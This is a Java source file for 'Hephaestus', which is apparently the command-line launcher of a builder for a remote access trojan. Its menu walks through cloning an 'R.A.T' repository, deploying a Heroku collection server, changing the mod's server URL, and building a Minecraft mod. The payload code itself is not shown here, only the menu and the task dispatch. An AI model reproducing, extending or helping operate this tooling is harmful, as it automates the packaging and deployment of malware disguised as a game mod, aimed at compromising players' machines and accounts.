package studio.dreamys;

import java.util.Scanner;

public class Hephaestus {
    public static Scanner sc = new Scanner(System.in);

    public static void main(String[] args) {
        System.out.println("\n /$$   /$$                     /$$                                       /$$                        \n" +
                "| $$  | $$                    | $$                                      | $$                        \n" +
                "| $$  | $$  /$$$$$$   /$$$$$$ | $$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$$ /$$$$$$   /$$   /$$  /$$$$$$$\n" +
                "| $$$$$$$$ /$$__  $$ /$$__  $$| $$__  $$ |____  $$ /$$__  $$ /$$_____/|_  $$_/  | $$  | $$ /$$_____/\n" +
                "| $$__  $$| $$$$$$$$| $$  \\ $$| $$  \\ $$  /$$$$$$$| $$$$$$$$|  $$$$$$   | $$    | $$  | $$|  $$$$$$ \n" +
                "| $$  | $$| $$_____/| $$  | $$| $$  | $$ /$$__  $$| $$_____/ \\____  $$  | $$ /$$| $$  | $$ \\____  $$\n" +
                "| $$  | $$|  $$$$$$$| $$$$$$$/| $$  | $$|  $$$$$$$|  $$$$$$$ /$$$$$$$/  |  $$$$/|  $$$$$$/ /$$$$$$$/\n" +
                "|__/  |__/ \\_______/| $$____/ |__/  |__/ \\_______/ \\_______/|_______/    \\___/   \\______/ |_______/ \n" +
                "                    | $$                                                                            \n" +
                "                    | $$                                                                            \n" +
                "                    |__/                                                                -dxxxxy#0776\n");

        System.out.println("0. Full setup (will run 1 to 9)\n");
        System.out.println("1. Clone R.A.T repository");
        System.out.println("<---<Server>--->");
        System.out.println("2. Initialize server repository");
        System.out.println("3. Create heroku app");
        System.out.println("4. Change config vars");
        System.out.println("5. Deploy heroku app");
        System.out.println("<---<Mod>--->");
        System.out.println("6. Run setupDecompWorkspace");
        System.out.println("7. Change server url");
        System.out.println("8. Build mod");
        System.out.println("9. Kill daemons");
        System.out.println("<---<Extra>--->");
        System.out.println("10. Clear cache");
        System.out.println("\nEnter the number of the task you want to run: ");

        int task = sc.nextInt();
        if (task < 0 || task > 10) {
            System.out.println("Invalid task number.");
        } else {
            switch (task) {
                case 0:
                    Tasks.fullSetup();
                    break;
                case 1:
                    Tasks.cloneMainRepo();
                    break;
                case 2:
                    Tasks.initializeServerRepo();
                    break;
                case 3:
                    Tasks.createHerokuApp();
                    break;
                case 4:
                    Tasks.changeConfigVars();
                    break;
                case 5:
                    Tasks.deployHerokuApp();
                    break;
                case 6:
                    Tasks.setupDecompWorkspace();
                    break;
                case 7:
                    Tasks.changeModServerURL();
                    break;
                case 8:
                    Tasks.build();
                    break;
                case 9:
                    Tasks.killDaemons();
                    break;
                case 10:
                    Tasks.clearCache();
                    break;
            }
        }
    }
}
